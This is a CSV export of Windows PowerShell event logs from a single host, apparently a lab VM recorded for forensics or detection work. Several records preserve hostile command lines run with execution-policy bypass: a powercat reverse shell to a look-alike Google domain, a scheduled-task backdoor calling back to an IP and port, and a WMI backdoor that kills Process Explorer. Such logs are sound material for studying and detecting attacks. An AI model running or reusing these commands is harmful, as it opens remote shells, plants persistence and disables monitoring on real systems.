RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload
103,103,2025-07-29 16:24:45.7467365,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=36201329-3804-4350-a6c0-1cb8b2eaa83c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
104,104,2025-07-29 16:24:45.7488915,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=36201329-3804-4350-a6c0-1cb8b2eaa83c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
105,105,2025-07-29 16:24:45.7617199,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=36201329-3804-4350-a6c0-1cb8b2eaa83c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
106,106,2025-07-29 16:24:46.3125618,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Engine state is changed from None to Available,,,"HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=36201329-3804-4350-a6c0-1cb8b2eaa83c\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.6093\n\tRunspaceId=8185b3bd-894d-48cf-82e4-7b8ca8f234fa\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
107,107,2025-07-29 17:56:03.7302750,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
108,108,2025-07-29 17:56:03.7501265,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
109,109,2025-07-29 17:56:03.7714899,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
110,110,2025-07-29 17:56:03.8001981,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
111,111,2025-07-29 17:56:03.8071250,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
112,112,2025-07-29 17:56:03.8071250,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
113,113,2025-07-29 17:56:04.0638312,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Engine state is changed from None to Available,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=5.1.19041.6093\n\tRunspaceId=e84c2a22-fc00-4cd4-8fae-4a63d84694c9\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
114,114,2025-07-29 17:56:05.7566137,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Engine state is changed from Available to Stopped,,,"HostApplication=powershell -Exec Bypass . ""C:\TMP\nc.ps1"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=15\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=99f517ca-1ba8-434a-8ea2-146a5efd63c8\n\tHostApplication=powershell -Exec Bypass . \""C:\\TMP\\nc.ps1\"";powercat -c www.googleaccountsservices.com -p 80 -t 2 -e cmd\n\tEngineVersion=5.1.19041.6093\n\tRunspaceId=e84c2a22-fc00-4cd4-8fae-4a63d84694c9\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
115,115,2025-07-29 17:58:34.3944082,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
116,116,2025-07-29 17:58:34.4256863,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
117,117,2025-07-29 17:58:34.4364957,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
118,118,2025-07-29 17:58:34.4472421,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
119,119,2025-07-29 17:58:34.4524165,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
120,120,2025-07-29 17:58:34.4570985,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
121,121,2025-07-29 17:58:35.0060721,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Engine state is changed from None to Available,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=5.1.19041.6093\n\tRunspaceId=02158a96-9ecd-4285-960f-9f929014a5aa\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
122,122,2025-07-29 17:58:44.2895393,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Engine state is changed from Available to Stopped,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=15\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=af6811a4-34da-4a44-9a08-4c8e988cc1d0\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\schtasks-backdoor.ps1;Invoke-Tasksbackdoor -method cmd -ip 8.8.8.8 -port 9999 -time 2\n\tEngineVersion=5.1.19041.6093\n\tRunspaceId=02158a96-9ecd-4285-960f-9f929014a5aa\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
123,123,2025-07-29 17:59:15.9824353,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=7b07205e-dd25-4221-9796-e4d62a6059da\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
124,124,2025-07-29 17:59:15.9950692,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=7b07205e-dd25-4221-9796-e4d62a6059da\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
125,125,2025-07-29 17:59:16.0066762,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=7b07205e-dd25-4221-9796-e4d62a6059da\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
126,126,2025-07-29 17:59:16.0142868,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-5A3QN5S,2,,Provider is Started,,,"HostApplication=powershell.exe -Exec ByPasS . C:\TMP\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1","HostName=ConsoleHost","HostVersion=5.1.19041.6093",,,,,False,C:\Users\VM\Desktop\WindowsPowershell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.6093\n\tHostId=7b07205e-dd25-4221-9796-e4d62a6059da\n\tHostApplication=powershell.exe -Exec ByPasS . C:\\TMP\\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
